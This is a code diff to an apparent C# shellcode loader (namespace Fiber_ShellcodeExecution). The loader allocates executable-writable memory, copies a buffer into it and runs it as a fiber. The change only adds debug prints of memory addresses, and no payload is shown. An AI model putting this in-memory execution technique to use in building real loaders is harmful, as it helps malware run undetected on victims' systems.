@@ -40,16 +40,20 @@ namespace Fiber_ShellcodeExecution
 
 			// Convert the main thread to fiber
 			IntPtr main_fiber = ConvertThreadToFiber(IntPtr.Zero);
+			Console.WriteLine($"main_fiber address: 0x{main_fiber.ToInt64():X16}");
+
 			IntPtr buf1_address = VirtualAlloc(
 				IntPtr.Zero, 
 				(UInt32)buf1.Length, 
 				AllocationType.Commit, 
 				AllocationProtect.PAGE_EXECUTE_READWRITE);
+			Console.WriteLine($"buf1 address: 0x{buf1_address.ToInt64():X16}");
 
 			Marshal.Copy(buf1, 0, (buf1_address), buf1.Length);
 
 			// CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL)
 			IntPtr buf1_fiber = CreateFiber(0, buf1_address, IntPtr.Zero);
+			Console.WriteLine($"fiber address: 0x{buf1_fiber.ToInt64():X16}");
 
 			// Manually switch to the fiber to execute buf1
 			SwitchToFiber(buf1_fiber);
